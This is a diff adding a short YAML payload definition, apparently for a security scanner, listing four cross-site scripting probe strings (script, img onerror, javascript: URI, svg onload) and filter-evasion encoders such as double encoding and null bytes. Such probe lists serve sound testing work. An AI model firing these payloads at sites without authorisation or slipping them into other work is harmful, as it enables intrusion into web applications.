@@ -1,0 +1,7 @@
+schema: 'rsecopsx.payloads/v1'
+classes:
+  - id: 'xss'
+    cwe: 'CWE-79'
+    description: 'Cross-site scripting probes for reflection/response sinks.'
+    payloads: ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 'javascript:alert(1)', '<svg/onload=alert(1)>']
+    encoders: ['url', 'html', 'js', 'unicode', 'double_encode', 'null_byte', 'case_flip', 'polyglot']
